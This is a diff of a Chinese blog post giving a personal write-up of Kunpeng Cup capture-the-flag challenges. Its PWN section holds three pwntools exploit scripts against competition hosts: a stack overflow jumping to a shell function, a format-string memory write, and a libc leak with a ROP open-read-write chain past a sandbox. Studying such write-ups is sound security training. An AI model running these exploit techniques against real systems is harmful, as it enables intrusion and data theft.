@@ -5,10 +5,36 @@
 <meta property="og:site_name" content="The Sun Also Rises">
 <meta property="og:description" content="PWN       signin_for_pwn1 @wulala11   read(0, buf, v8);通过这个可以跳转到gen_shell从而得到flag2v5输入-1，可以绕过判断，并且在给unsigned __int8 v8赋值时，由于v8是无符号数，所以v8会是一个很大的数。flag1直接输入3到8之内的数就可以得到。  Exp: 123456">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/4.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/5.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/6.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/7.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/8.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/9.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/10.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/11.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/12.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/13.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/14.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/15.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/16.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/17.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/18.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/19.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/20.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/21.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/22.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/23.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/24.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/25.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/26.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/27.png">
+<meta property="og:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/28.png">
 <meta property="article:published_time" content="2023-04-25T03:05:31.000Z">
-<meta property="article:modified_time" content="2023-04-25T05:00:44.596Z">
+<meta property="article:modified_time" content="2023-04-25T05:09:13.508Z">
 <meta property="article:author" content="wulala">
-<meta name="twitter:card" content="summary"><title>鲲鹏杯个人wp | The Sun Also Rises</title><link ref="canonical" href="https://wulala11.github.io/2023/04/25/kunpenbei/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wulala11.github.io/2023/04/25/kunpenbei/4.png"><title>鲲鹏杯个人wp | The Sun Also Rises</title><link ref="canonical" href="https://wulala11.github.io/2023/04/25/kunpenbei/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
 var CONFIG = {
   root: '/',
   algolia: undefined,
@@ -36,70 +62,83 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></he
         <h2 id="PWN"   >
           <a href="#PWN" class="heading-link"><i class="fas fa-link"></i></a><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2>
       <p>signin_for_pwn1 @wulala11</p>
-
-
+<img src="/2023/04/25/kunpenbei/4.png" class="">
+<img src="/2023/04/25/kunpenbei/5.png" class="">
 <p>read(0, buf, v8);<br>通过这个可以跳转到gen_shell从而得到flag2<br>v5输入-1，可以绕过判断，并且在给unsigned __int8 v8赋值时，由于v8是无符号数，所以v8会是一个很大的数。<br>flag1直接输入3到8之内的数就可以得到。</p>
-
+<img src="/2023/04/25/kunpenbei/6.png" class="">
 <p>Exp:</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./bs&#x27;)</span><br><span class="line">io=remote(&#x27;43.143.224.232&#x27;,10001)</span><br><span class="line">sh=0x4006D7 #gen_shell函数地址</span><br><span class="line">payload=b&#x27;a&#x27;*13+p64(0)+p64(sh)</span><br><span class="line">io.sendline(str(-1))#第一个判断绕过</span><br><span class="line">io.sendline(payload)#利用read来跳转到gen_shell函数地址</span><br><span class="line">io.sendlineafter(&#x27;good!&#x27;,str(6))#第二个判断绕过</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
 <p>–<br>bs @wulala11</p>
 <hr>
-
+<img src="/2023/04/25/kunpenbei/7.png" class="">
 <p>格式化字符串漏洞改大数和小数。<br>用到了pwntools的一个工具fmtstr_payload，可以实现修改任意内存</p>
-
+<img src="/2023/04/25/kunpenbei/8.png" class="">
 <p>格式化字符串找出偏移是8</p>
-
+<img src="/2023/04/25/kunpenbei/9.png" class="">
 <p>套上去fmtstr_payload(offset,{原地址：目的地址})<br>试了单独改a和b，不行，只有同时修改a,b才能成功获取flag</p>
-
+<img src="/2023/04/25/kunpenbei/10.png" class="">
 <p>Exp:</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./bs&#x27;)</span><br><span class="line">io=remote(&#x27;43.143.224.232&#x27;,10000)</span><br><span class="line">offset=8#利用格式化字符串漏洞</span><br><span class="line">payload=fmtstr_payload(offset,&#123;0x601060:305419896&#125;)#0x601060为b的data段地址，发送这个payload可以来修改b的值</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload=fmtstr_payload(offset,&#123;0x601058:2&#125;)#0x601058为a的data段地址，发送这个payload可以来修改a的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
 <p>–<br>Limited_sginup @wulala11</p>
 <hr>
 <p>未完成 ，写出来再修改吧（这句话好像有点熟悉，前面的都忘记补了，嗯。。。。）<br>格式化字符串找不到偏移。<br>开了59号沙箱，用orw方法。<br>Exp：</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./limited_signup&#x27;)</span><br><span class="line">io=remote(&#x27;pwn.detectivelfy.top&#x27;,10009)</span><br><span class="line">libc=ELF(&#x27;libc-2.27.so&#x27;)</span><br><span class="line">bss=0x202160</span><br><span class="line">leave_ret=0x000c7d</span><br><span class="line">io.sendlineafter(&#x27;Your username: &#x27;,&#x27;%p%31$p&#x27;)</span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">stack=int(io.recv(12),16)</span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">libc_base=int(io.recv(12),16)-128-libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">log.info(hex(stack))</span><br><span class="line">log.info(hex(libc_base))</span><br><span class="line">openn=libc_base+libc.symbols[&#x27;open&#x27;]</span><br><span class="line">read=libc_base+libc.symbols[&#x27;read&#x27;]</span><br><span class="line">write=libc_base+libc.symbols[&#x27;write&#x27;]</span><br><span class="line">pop_rdi_ret=libc_base+0x000000000002164f</span><br><span class="line">pop_rsi_ret=libc_base+0x0000000000023a6a</span><br><span class="line">pop_rdx_ret=libc_base+0x0000000000001b96</span><br><span class="line">payload=p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss)+p64(pop_rdx_ret)+p64(0x100)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(bss)+p64(pop_rsi_ret)+p64(0)+p64(openn)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss+0x10)+p64(pop_rdx_ret)+p64(0x100)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(1)+p64(write)</span><br><span class="line">payload+=b&#x27;\0&#x27;*(192-len(payload))</span><br><span class="line">payload+=p64(stack+8)+p64(leave_ret)</span><br><span class="line">io.sendlineafter(&#x27;password(0-8 chars): &#x27;,payload)</span><br><span class="line">io.send(&#x27;./flag\x00&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
-<hr>
-<p>REVERSE<br>signin_for_reverse @wulala11<br>无壳，直接拖到ida分析。</p>
 
+
+        <h2 id="REVERSE"   >
+          <a href="#REVERSE" class="heading-link"><i class="fas fa-link"></i></a><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2>
+      
+        <h2 id="signin-for-reverse-wulala11"   >
+          <a href="#signin-for-reverse-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#signin-for-reverse-wulala11" class="headerlink" title="signin_for_reverse @wulala11"></a>signin_for_reverse @wulala11</h2>
+      <p>无壳，直接拖到ida分析。</p>
+<img src="/2023/04/25/kunpenbei/11.png" class="">
 <p>注意str_len不是计算长度，是一个函数。</p>
-
+<img src="/2023/04/25/kunpenbei/12.png" class="">
 <p>所以sss到flag经过4个步骤。</p>
-
+<img src="/2023/04/25/kunpenbei/13.png" class="">
 <p>这些是sss<br>Exp：</p>
+<img src="/2023/04/25/kunpenbei/14.png" class="">
+<img src="/2023/04/25/kunpenbei/15.png" class="">
+<p>不知道为什么flag变成gamg了，手动改回去就行。</p>
 
-
-
-        <h2 id="不知道为什么flag变成gamg了，手动改回去就行。"   >
-          <a href="#不知道为什么flag变成gamg了，手动改回去就行。" class="heading-link"><i class="fas fa-link"></i></a><a href="#不知道为什么flag变成gamg了，手动改回去就行。" class="headerlink" title="不知道为什么flag变成gamg了，手动改回去就行。"></a>不知道为什么flag变成gamg了，手动改回去就行。</h2>
-      <p>INTIME @wulala11<br>手搓大法好！！！！只要在60.5秒时按回车就行，是不是很简单(<br>忘记把搓出来的flag截出来了。<br>手搓的时候可以开多些程序。</p>
+        <h2 id="INTIME-wulala11"   >
+          <a href="#INTIME-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#INTIME-wulala11" class="headerlink" title="INTIME @wulala11"></a>INTIME @wulala11</h2>
+      <p>手搓大法好！！！！只要在60.5秒时按回车就行，是不是很简单(<br>忘记把搓出来的flag截出来了。<br>手搓的时候可以开多些程序。</p>
 <p>比较有意思的是这题的hint<br>应该代表三种解法吧。<br>要么在60.05秒按enter（手搓）<br>要么让你的enter按在60.05秒（写脚本控制按回车的时间）<br>要么让你按enter的时间是60.05秒（外挂方法更改时间？）</p>
-<hr>
-<p>Baby4 @wulala11<br>掺杂私货的rc4加密。<br>有upx壳，脱壳后拉入ida分析。</p>
 
-
+        <h2 id="Baby4-wulala11"   >
+          <a href="#Baby4-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Baby4-wulala11" class="headerlink" title="Baby4 @wulala11"></a>Baby4 @wulala11</h2>
+      <p>掺杂私货的rc4加密。<br>有upx壳，脱壳后拉入ida分析。</p>
+<img src="/2023/04/25/kunpenbei/16.png" class="">
+<img src="/2023/04/25/kunpenbei/17.png" class="">
 <p>看出来应该是rc4加密，直接找了个脚本套进去发现不行，仔细看源码发现多了个+2.</p>
-
+<img src="/2023/04/25/kunpenbei/18.png" class="">
 <p>只要在自己的脚本上同样加上2就行。<br>不过待加密的字符串有0到40个，使用越界到v5，把v5的^G也加密了。</p>
-
+<img src="/2023/04/25/kunpenbei/19.png" class="">
 <p>Exp:</p>
-
-
-
-        <h2 id="记得加上’-’。"   >
-          <a href="#记得加上’-’。" class="heading-link"><i class="fas fa-link"></i></a><a href="#记得加上’-’。" class="headerlink" title="记得加上’}’。"></a>记得加上’}’。</h2>
-      <p>do some shop @wulala11<br>是pyd后缀的文件，没见过，长见识了。<br>运行后，发现是一个运气（dubo）游戏,赚到10000块能买flag。<br>拿到10000块后发现买到的flag是假的。</p>
-
-<p>只能找别的方法了。<br>这个指令可以查看pyd文件可调用的函数。</p>
-
-
-<p>Functions部分为可以被调用的函数。<br>试了一遍，发现调用hidden_func()后，这个应该是flag了。</p>
-
-<p>运行后出现的意思大概是给出1到999999随机数，他会和box里一个永远不变的数对比，所以爆破。<br>在functions里面也给出了check_box函数，所以直接对它进行爆破。<br>Exp:</p>
-
-<p>成功得到flag</p>
-
+<img src="/2023/04/25/kunpenbei/20.png" class="">
+<img src="/2023/04/25/kunpenbei/21.png" class="">
+<p>记得加上’}’。<br>do some shop @wulala11</p>
 <hr>
-<p>Math_game @wulala11<br>数织游戏，找了个软件，直接把图片内容填进去，得到一个二维码，扫码获得flag.</p>
-</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://wulala11.github.io">wulala</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://wulala11.github.io/2023/04/25/kunpenbei/">https://wulala11.github.io/2023/04/25/kunpenbei/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2023/04/07/heap/"><span class="paginator-prev__text">堆入门知识</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">1.</span> <span class="toc-text">
-          PWN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88flag%E5%8F%98%E6%88%90gamg%E4%BA%86%EF%BC%8C%E6%89%8B%E5%8A%A8%E6%94%B9%E5%9B%9E%E5%8E%BB%E5%B0%B1%E8%A1%8C%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">
-          不知道为什么flag变成gamg了，手动改回去就行。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%B0%E5%BE%97%E5%8A%A0%E4%B8%8A%E2%80%99-%E2%80%99%E3%80%82"><span class="toc-number">3.</span> <span class="toc-text">
-          记得加上’}’。</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>wulala</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script></body></html>
+<p>是pyd后缀的文件，没见过，长见识了。<br>运行后，发现是一个运气（dubo）游戏,赚到10000块能买flag。<br>拿到10000块后发现买到的flag是假的。</p>
+<img src="/2023/04/25/kunpenbei/22.png" class="">
+<p>只能找别的方法了。<br>这个指令可以查看pyd文件可调用的函数。</p>
+<img src="/2023/04/25/kunpenbei/23.png" class="">
+<img src="/2023/04/25/kunpenbei/24.png" class="">
+<p>Functions部分为可以被调用的函数。<br>试了一遍，发现调用hidden_func()后，这个应该是flag了。</p>
+<img src="/2023/04/25/kunpenbei/25.png" class="">
+<p>运行后出现的意思大概是给出1到999999随机数，他会和box里一个永远不变的数对比，所以爆破。<br>在functions里面也给出了check_box函数，所以直接对它进行爆破。<br>Exp:</p>
+<img src="/2023/04/25/kunpenbei/26.png" class="">
+<p>成功得到flag</p>
+<img src="/2023/04/25/kunpenbei/27.png" class="">
+
+        <h2 id="Math-game-wulala11"   >
+          <a href="#Math-game-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Math-game-wulala11" class="headerlink" title="Math_game @wulala11"></a>Math_game @wulala11</h2>
+      <p>数织游戏，找了个软件，直接把图片内容填进去，得到一个二维码，扫码获得flag.</p>
+<img src="/2023/04/25/kunpenbei/28.png" class=""></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://wulala11.github.io">wulala</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://wulala11.github.io/2023/04/25/kunpenbei/">https://wulala11.github.io/2023/04/25/kunpenbei/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2023/04/07/heap/"><span class="paginator-prev__text">堆入门知识</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">1.</span> <span class="toc-text">
+          PWN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">2.</span> <span class="toc-text">
+          REVERSE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signin-for-reverse-wulala11"><span class="toc-number">3.</span> <span class="toc-text">
+          signin_for_reverse @wulala11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#INTIME-wulala11"><span class="toc-number">4.</span> <span class="toc-text">
+          INTIME @wulala11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby4-wulala11"><span class="toc-number">5.</span> <span class="toc-text">
+          Baby4 @wulala11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Math-game-wulala11"><span class="toc-number">6.</span> <span class="toc-text">
+          Math_game @wulala11</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>wulala</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script></body></html>
